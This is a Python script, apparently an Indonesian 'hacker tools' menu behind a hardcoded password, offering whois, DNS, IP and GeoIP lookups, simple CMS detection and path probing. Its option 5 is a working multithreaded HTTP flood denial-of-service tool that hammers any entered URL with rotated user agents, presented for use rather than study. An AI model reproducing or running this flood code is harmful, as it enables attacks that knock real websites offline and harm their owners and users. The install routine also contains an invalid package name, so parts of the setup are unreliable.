import os
import socket
import platform
import time
import random
import requests
import threading
from colorama import Fore, init
import whois
import dns.resolver

# Inisialisasi colorama
init(autoreset=True)

# Password untuk login
password = "xboylinux"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
]

# Fungsi untuk tampilkan banner login
def tampil_banner():
    os.system("clear")
    print(Fore.RED + "███████╗ ██████╗ ██╗   ██╗     ██╗     ██╗███╗   ██╗██╗   ██╗")
    print(Fore.RED + "██╔════╝██╔═══██╗██║   ██║     ██║     ██║████╗  ██║██║   ██║")
    print(Fore.RED + "███████╗██║   ██║██║   ██║     ██║     ██║██╔██╗ ██║██║   ██║")
    print(Fore.RED + "╚════██║██║▄▄ ██║██║   ██║     ██║     ██║██║╚██╗██║██║   ██║")
    print(Fore.RED + "███████║╚██████╔╝╚██████╔╝     ███████╗██║██║ ╚████║╚██████╔╝")
    print(Fore.RED + "╚══════╝ ╚══▀▀═╝  ╚═════╝      ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ")
    print(Fore.RED + "────────────────────────────────────────────────────────────")
    print(Fore.GREEN + "                  💀 TOOLS X'BOY LINUX 💀")
    print(Fore.RED + "────────────────────────────────────────────────────────────")
    print(Fore.CYAN + "               Author : X'Boy Linux")
    print(Fore.CYAN + "               Team   : Foursdeath Team")
    print(Fore.YELLOW + """
       🌐 Explore, Learn, and Dominate
       ⚔️  United as one, fear none
    """)
    print(Fore.RED + "────────────────────────────────────────────────────────────")

# Fungsi untuk login
def login():
    entered_password = input(Fore.CYAN + "Password: ").strip()

    if entered_password == password:
        print(Fore.GREEN + "\n[+] Login berhasil!")
        time.sleep(1)
        os.system("clear")
        return True
    else:
        print(Fore.RED + "\n[!] Password salah!")
        time.sleep(1)
        os.system("clear")
        return False

# Fungsi untuk menampilkan informasi user
def tampil_info_user():
    print(Fore.CYAN + "\n[INFO] Informasi User:")
    print(Fore.YELLOW + f"IP Address: {socket.gethostbyname(socket.gethostname())}")
    print(Fore.YELLOW + f"System: {platform.system()}")
    print(Fore.YELLOW + f"Node Name: {platform.node()}")
    print(Fore.YELLOW + f"Release: {platform.release()}")
    print(Fore.YELLOW + f"Version: {platform.version()}")
    print(Fore.YELLOW + f"Machine: {platform.machine()}")
    print(Fore.YELLOW + f"Processor: {platform.processor()}")
    print(Fore.YELLOW + f"Username: {os.getlogin()}")
    print(Fore.YELLOW + f"Current Directory: {os.getcwd()}")

def menu():
    print(Fore.MAGENTA + "\n┌" + "─" * 58 + "┐")
    print(Fore.MAGENTA + "│" + Fore.YELLOW + "                     ⚙️  MENU TOOLS                      " + Fore.MAGENTA + "│")
    print(Fore.MAGENTA + "├" + "─" * 58 + "┤")
    print(Fore.CYAN + "│" + "   [1] Whois Lookup                                   " + Fore.CYAN + "│")
    print(Fore.CYAN + "│" + "   [2] IP Lookup                                      " + Fore.CYAN + "│")
    print(Fore.CYAN + "│" + "   [3] DNS Lookup                                     " + Fore.CYAN + "│")
    print(Fore.CYAN + "│" + "   [4] CMS Detection                                  " + Fore.CYAN + "│")
    print(Fore.CYAN + "│" + "   [5] HTTP Flood (DoS)                               " + Fore.CYAN + "│")
    print(Fore.CYAN + "│" + "   [6] GeoIP Lookup                                   " + Fore.CYAN + "│")
    print(Fore.CYAN + "│" + "   [7] CMS Scanner by Wordlist                        " + Fore.CYAN + "│")
    print(Fore.CYAN + "│" + "   [8] Install All Tools                              " + Fore.CYAN + "│")
    print(Fore.CYAN + "│" + "   [9] Exit                                           " + Fore.CYAN + "│")
    print(Fore.MAGENTA + "└" + "─" * 58 + "┘")

def tools_choice():
    choice = input(Fore.YELLOW + "\n➤ Pilih Tools (1-9): ").strip()

    if choice == "1":
        whois_lookup()
    elif choice == "2":
        ip_lookup()
    elif choice == "3":
        dns_lookup()
    elif choice == "4":
        cms_detection()
    elif choice == "5":
        http_flood()
    elif choice == "6":
        geoip_lookup()
    elif choice == "7":
        cms_scanner_by_wordlist()
    elif choice == "8":
        install_all_tools()
    elif choice == "9":
        print(Fore.RED + "Keluar...")
        exit()
    else:
        print(Fore.RED + "Pilihan tidak valid!")
        tools_choice()

# WHOIS Lookup
def whois_lookup():
    domain = input(Fore.CYAN + "Masukkan domain untuk WHOIS lookup: ")
    w = whois.whois(domain)
    print(Fore.YELLOW + str(w))

# IP Lookup
def ip_lookup():
    ip = input(Fore.CYAN + "Masukkan IP untuk lookup: ")
    url = f"https://ipinfo.io/{ip}/json"
    response = requests.get(url)
    data = response.json()
    print(Fore.YELLOW + f"IP: {data['ip']}")
    print(Fore.YELLOW + f"Location: {data['city']}, {data['region']}, {data['country']}")
    print(Fore.YELLOW + f"Org: {data['org']}")

# DNS Lookup
def dns_lookup():
    domain = input(Fore.CYAN + "Masukkan domain untuk DNS lookup: ")
    result = dns.resolver.resolve(domain, 'A')
    for ipval in result:
        print(Fore.YELLOW + f"IP Address: {ipval.to_text()}")

# CMS Detection (simple version)
def cms_detection():
    url = input(Fore.CYAN + "Masukkan URL untuk CMS Detection: ")
    if "wp-content" in requests.get(url).text:
        print(Fore.GREEN + "Website ini menggunakan WordPress.")
    elif "Joomla" in requests.get(url).text:
        print(Fore.GREEN + "Website ini menggunakan Joomla.")
    else:
        print(Fore.RED + "CMS tidak terdeteksi.")

# HTTP Flood (DoS) menggunakan threading
def http_flood():
    url = input(Fore.CYAN + "Masukkan URL target untuk HTTP Flood: ")
    count = int(input(Fore.CYAN + "Jumlah request yang akan dikirim per thread: "))
    thread_count = int(input(Fore.CYAN + "Jumlah thread yang akan digunakan: "))

    def flood():
        for _ in range(count):
            try:
                headers = {'User-Agent': random.choice(USER_AGENTS)}
                requests.get(url, headers=headers)
            except requests.exceptions.RequestException:
                print(Fore.RED + "[!] Request gagal!")

    # Membuat threads untuk flood
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=flood)
        threads.append(thread)
        thread.start()

    # Menunggu semua thread selesai
    for thread in threads:
        thread.join()

    print(Fore.GREEN + f"HTTP Flood selesai ke {url} dengan {thread_count} threads!")

# GeoIP Lookup
def geoip_lookup():
    ip = input(Fore.CYAN + "Masukkan IP untuk GeoIP lookup: ")
    url = f"https://geolocation-db.com/json/{ip}&position=true"
    response = requests.get(url)
    data = response.json()
    print(Fore.YELLOW + f"IP: {data['IPv4']}")
    print(Fore.YELLOW + f"Location: {data['country_name']}, {data['state']}, {data['city']}")
    print(Fore.YELLOW + f"Latitude/Longitude: {data['latitude']}, {data['longitude']}")

# CMS Scanner by Wordlist
def cms_scanner_by_wordlist():
    url = input(Fore.CYAN + "Masukkan URL untuk CMS Scanner: ")
    wordlist = ["wp-content", "administrator", "user/login", "wp-admin", "joomla"]
    for word in wordlist:
        target = url + "/" + word
        if requests.get(target).status_code == 200:
            print(Fore.GREEN + f"Menemukan CMS di URL: {target}")
        else:
            print(Fore.RED + f"Tidak menemukan CMS di URL: {target}")

# Install All Tools
def install_all_tools():
    print(Fore.YELLOW + "Menginstal semua tools...")
    os.system("pkg update -y")
    os.system("pkg upgrade -y")
    os.system("pkg install python3 -y")
    os.system("pkg install python3-pip -y")
    os.system("pip install requests")
    os.system("pip install whois")
    os.system("pip install dns.resolver")
    print(Fore.GREEN + "Semua tools telah berhasil diinstal!")

def main():
    tampil_banner()
    
    while True:
        if login():
            tampil_banner()
            tampil_info_user()  # Menampilkan info user setelah login
            menu()  # Tampilkan menu tools
            tools_choice()  # Pilih tools untuk digunakan

if __name__ == "__main__":
    main()
